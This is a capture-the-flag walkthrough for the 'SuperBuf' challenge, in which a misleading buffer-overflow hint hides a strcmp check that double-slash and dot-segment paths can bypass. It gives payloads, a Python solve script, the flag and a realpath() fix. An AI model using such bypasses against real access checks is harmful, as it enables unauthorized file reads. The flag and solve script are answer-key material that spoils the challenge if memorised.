# SuperBuf — CTF Walkthrough

**CTF:** Maryland / Virginia Cyber Range
**Category:** Reverse Engineering / Binary Exploitation
**Challenge:** SuperBuf
**Connection:** `nc superbuf.challenges.virginiacyberrange.net 9006`
**Flag:** `flag{h3s_supr_j4ck3d!!}`

---

## Overview

SuperBuf presents as a buffer overflow challenge (the name is a dead giveaway), with a hint that nudges you toward stack smashing. The real vulnerability, however, is a **path traversal / strcmp bypass** in the file-serving logic. The flag lives in a "locked" directory, and the lock is enforced via an exact string comparison — not a memory-resident lock variable. Exploiting this is a single payload away.

---

## Enumeration

### Step 1 — Connect and Probe

```bash
nc superbuf.challenges.virginiacyberrange.net 9006
```

The service immediately asks:

```
Would you like to view the directory? (y/n)
```

Answering `y` dumps a long directory listing:

```
Secrets/
    flag.txt
sysinfo/
    README.md
    ...
hint.txt
...
Enter the name of the file you would like to view:
/home/superbuf/important/
```

Key observations:
- The base directory is `/home/superbuf/important/`
- `Secrets/flag.txt` is explicitly visible in the listing
- `hint.txt` exists and is readable
- The service resolves input filenames relative to the base directory

### Step 2 — Read the Hint

```bash
printf "y\nhint.txt\n" | nc superbuf.challenges.virginiacyberrange.net 9006
```

Output:
```
I mean. its in the name. if you havent figured it out alredy.
The lock/unlock variable is stored right after the input array.
```

The hint is intentionally misleading — it implies the solution is a traditional stack-based buffer overflow where overwriting the `lock` variable in memory unlocks the file. This is misdirection.

### Step 3 — Test the Locked File

```bash
printf "y\nSecrets/flag.txt\n" | nc superbuf.challenges.virginiacyberrange.net 9006
```

Response:
```
You cannot view this file. Exiting...
```

The file exists (we can see it in the directory), but access is denied. This is the lock in action.

---

## Analysis

### What the Hint Implies vs. What's Actually Happening

The hint describes a classic buffer overflow layout:

```c
char filename[N];   // input buffer
int  lock;          // sits immediately after filename in memory
```

The theory: overflow `filename` with enough bytes to overwrite `lock`, changing it from `1` (locked) to `0` (unlocked), and the flag becomes readable.

### Testing the Overflow Theory

```bash
python3 -c "
import sys
payload = b'y\n' + b'A'*200 + b'\nSecrets/flag.txt\n'
sys.stdout.buffer.write(payload)
" | nc superbuf.challenges.virginiacyberrange.net 9006
```

Still `"You cannot view this file."` No matter the padding size, the response doesn't change in the expected way.

At ~48+ characters of padding on the *filename* input, the response switches to `"File not found"` instead — because we're corrupting the filename itself, not a separate lock variable.

### The Real Vulnerability — strcmp Path Bypass

The actual locking mechanism is almost certainly implemented as:

```c
if (strcmp(filename, "Secrets/flag.txt") == 0) {
    printf("You cannot view this file. Exiting...\n");
    exit(0);
}

FILE *f = fopen(filename, "r");
```

The check uses `strcmp` — an **exact** byte-for-byte string comparison. The filesystem, on the other hand, is far more flexible about how it resolves paths.

### Path Equivalence on Linux

These paths all resolve to the **same file**:

| Path | Resolves To |
|------|-------------|
| `Secrets/flag.txt` | `/home/superbuf/important/Secrets/flag.txt` |
| `Secrets//flag.txt` | Same (double slash is ignored) |
| `Secrets/./flag.txt` | Same (`.` means "current directory") |
| `Secrets/../Secrets/flag.txt` | Same (but this one didn't bypass — see below) |

The OS kernel normalizes path separators and `.` segments during the `open()` syscall. `strcmp`, however, compares raw bytes — so `"Secrets//flag.txt"` and `"Secrets/flag.txt"` are **different strings** but **the same file**.

---

## Exploitation

### Bypass Payload

```bash
printf "y\nSecrets//flag.txt\n" | nc superbuf.challenges.virginiacyberrange.net 9006
```

Or equivalently:

```bash
printf "y\nSecrets/./flag.txt\n" | nc superbuf.challenges.virginiacyberrange.net 9006
```

Response:

```
flag{h3s_supr_j4ck3d!!}
```

### What Didn't Work

| Path | Result |
|------|--------|
| `Secrets/flag.txt` | You cannot view this file |
| `./Secrets/flag.txt` | You cannot view this file (server normalizes before strcmp?) |
| `Secrets/../Secrets/flag.txt` | You cannot view this file (traversal blocked) |
| `secrets/flag.txt` | File not found (case sensitive) |
| `Secrets//flag.txt` ✅ | `flag{h3s_supr_j4ck3d!!}` |
| `Secrets/./flag.txt` ✅ | `flag{h3s_supr_j4ck3d!!}` |

---

## Automated Solve Script

```python
#!/usr/bin/env python3
import socket, time

HOST = "superbuf.challenges.virginiacyberrange.net"
PORT = 9006

def recv_until(sock, marker, timeout=5):
    data = b""
    sock.settimeout(timeout)
    try:
        while marker.encode() not in data:
            chunk = sock.recv(4096)
            if not chunk:
                break
            data += chunk
    except socket.timeout:
        pass
    return data.decode(errors="replace")

with socket.create_connection((HOST, PORT), timeout=10) as s:
    recv_until(s, "(y/n)")
    s.sendall(b"y\n")
    time.sleep(0.5)
    recv_until(s, "view:")
    s.sendall(b"Secrets//flag.txt\n")
    response = recv_until(s, "}", timeout=5)
    print(response.strip())
```

Run it:

```
$ python3 solve.py
flag{h3s_supr_j4ck3d!!}
```

---

## Key Takeaways

**1. Don't take the hint at face value.**
The challenge was titled "SuperBuf" and the hint screamed "buffer overflow," but the actual vulnerability was something completely different. CTF misdirection is real — always test your assumptions.

**2. strcmp ≠ filesystem equivalence.**
Locking file access with a raw string comparison against the user's input is broken by design. Filesystems understand path normalization; strcmp does not.

**3. Path normalization is a classic bypass surface.**
Anywhere a developer compares a path string directly without normalizing it first (via `realpath()`, `canonical_path()`, etc.) is potentially vulnerable to this class of bypass. This pattern also shows up in web applications as path traversal, dot-segment injection, and URL encoding bypasses.

**4. The correct fix:**
```c
// BAD — strcmp on raw user input
if (strcmp(filename, "Secrets/flag.txt") == 0) { ... }

// GOOD — compare resolved absolute paths
char resolved[PATH_MAX];
realpath(filename, resolved);
if (strcmp(resolved, "/home/superbuf/important/Secrets/flag.txt") == 0) { ... }
```

---

## Flag

```
flag{h3s_supr_j4ck3d!!}
```
